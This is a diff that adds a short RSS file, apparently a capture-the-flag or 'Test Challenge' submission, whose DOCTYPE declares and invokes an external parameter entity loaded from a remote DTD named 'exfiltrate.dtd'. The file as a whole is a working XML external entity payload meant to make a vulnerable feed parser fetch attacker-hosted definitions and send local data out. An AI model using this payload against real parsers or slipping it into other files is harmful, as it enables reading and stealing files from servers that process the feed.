@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/kaisham/test/refs/heads/master/exfiltrate.dtd">
+    %remote;
+]>
+<rss version="2.0">
+  <channel>
+    <title>Test Challenge</title>
+    <link>http://example.com</link>
+    <description>Verification RSS</description>
+    <item>
+      <title>Resultat</title>
+    </item>
+  </channel>
+</rss>
